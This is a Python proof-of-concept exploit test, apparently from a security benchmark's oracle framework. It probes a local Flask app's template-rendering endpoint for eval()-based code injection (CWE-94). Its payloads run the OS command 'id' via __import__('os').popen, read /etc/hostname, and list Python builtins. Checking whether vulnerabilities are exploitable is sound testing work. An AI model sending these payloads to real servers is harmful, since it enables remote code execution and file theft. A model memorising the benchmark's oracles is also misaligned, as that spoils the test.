"""PoC: Code injection via email template eval() (CWE-94).

Stage 3 adds eval(expr, {}, context) for computed expressions in
{{ expr }} blocks. An attacker sends a template with:

    {{ __import__('os').popen('id').read() }}

which executes arbitrary Python code on the server.
"""

from mosaic.oracle.exploit import ExploitTest


class FlaskEvalTemplateExploit(ExploitTest):
    """Code injection: arbitrary Python execution via template eval()."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_eval_template"

    def setup(self) -> None:
        resp = self.http_get("/")
        if not resp.ok:
            raise ConnectionError(
                f"Flask app not responding at {self.base_url}: {resp.status_code}"
            )

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Step 1: Verify template endpoint exists with a safe template
        safe_resp = self.http_post(
            "/api/templates/render",
            json={
                "template": "Hello {{name}}, your total is {{total}}.",
                "context": {"name": "Alice", "total": 99.99},
            },
        )
        evidence.append(f"Safe template: {safe_resp.status_code}")

        if safe_resp.status_code == 404:
            return False, "Template endpoint not found at POST /api/templates/render"

        if safe_resp.ok:
            try:
                result = safe_resp.json()
                evidence.append(f"Safe result: {result}")
            except Exception:
                pass

        # Step 2: Try a computed expression (the legitimate use case)
        compute_resp = self.http_post(
            "/api/templates/render",
            json={
                "template": "Discounted: {{ price * 0.9 }}",
                "context": {"price": 100},
            },
        )
        evidence.append(f"Computed expr: {compute_resp.status_code}")

        if compute_resp.ok:
            evidence.append(f"Computed result: {compute_resp.text[:200]}")
        else:
            # If computed expressions don't work, eval() wasn't added
            evidence.append("Computed expressions not supported — eval may not be present")

        # Step 3: Try code injection via __import__
        rce_payload = "{{ __import__('os').popen('id').read() }}"
        rce_resp = self.http_post(
            "/api/templates/render",
            json={
                "template": rce_payload,
                "context": {},
            },
        )
        evidence.append(f"RCE payload: {rce_resp.status_code}")
        evidence.append(f"RCE response: {rce_resp.text[:500]}")

        if rce_resp.ok:
            body = rce_resp.text.lower()
            if "uid=" in body or "root" in body:
                return True, (
                    "CWE-94 confirmed. POST /api/templates/render with template="
                    f"'{rce_payload}' executed OS command via eval(). Server "
                    f"returned command output with user identity. "
                    + " | ".join(evidence)
                )
            # Check for any non-empty rendered output (eval executed something)
            try:
                data = rce_resp.json()
                rendered = data.get("rendered", "")
                if rendered and rendered.strip() and "{{" not in rendered:
                    evidence.append(f"Rendered output: {rendered[:200]}")
                    return True, (
                        "CWE-94 confirmed. eval() executed __import__ expression "
                        "and returned result in rendered template. "
                        + " | ".join(evidence)
                    )
            except Exception:
                pass

        # Step 4: Try alternative — read a file
        file_payload = "{{ open('/etc/hostname').read() }}"
        file_resp = self.http_post(
            "/api/templates/render",
            json={
                "template": file_payload,
                "context": {},
            },
        )
        evidence.append(f"File read payload: {file_resp.status_code} {file_resp.text[:300]}")

        if file_resp.ok:
            try:
                data = file_resp.json()
                rendered = data.get("rendered", "")
                if rendered and rendered.strip() and "{{" not in rendered:
                    return True, (
                        "CWE-94 confirmed. eval() in template engine allows "
                        "arbitrary file read via open(). "
                        + " | ".join(evidence)
                    )
            except Exception:
                pass

        # Step 5: Try __builtins__ access for broader confirmation
        builtins_payload = "{{ dir(__builtins__) }}"
        builtins_resp = self.http_post(
            "/api/templates/render",
            json={
                "template": builtins_payload,
                "context": {},
            },
        )
        evidence.append(f"Builtins payload: {builtins_resp.status_code} {builtins_resp.text[:300]}")

        if builtins_resp.ok:
            body = builtins_resp.text
            if "eval" in body or "exec" in body or "__import__" in body:
                return True, (
                    "CWE-94 confirmed. Template eval() exposes Python builtins "
                    "including __import__, eval, exec. "
                    + " | ".join(evidence)
                )

        # If the computed expression worked but RCE didn't, it might have
        # restricted builtins — still a vulnerability if eval() is used
        if compute_resp.ok and rce_resp.ok:
            return True, (
                "CWE-94 probable. Template engine uses eval() for computed "
                "expressions (confirmed by arithmetic eval) and accepted "
                "code injection payload without error. "
                + " | ".join(evidence)
            )

        return False, (
            "Could not confirm code injection vulnerability. "
            + " | ".join(evidence)
        )
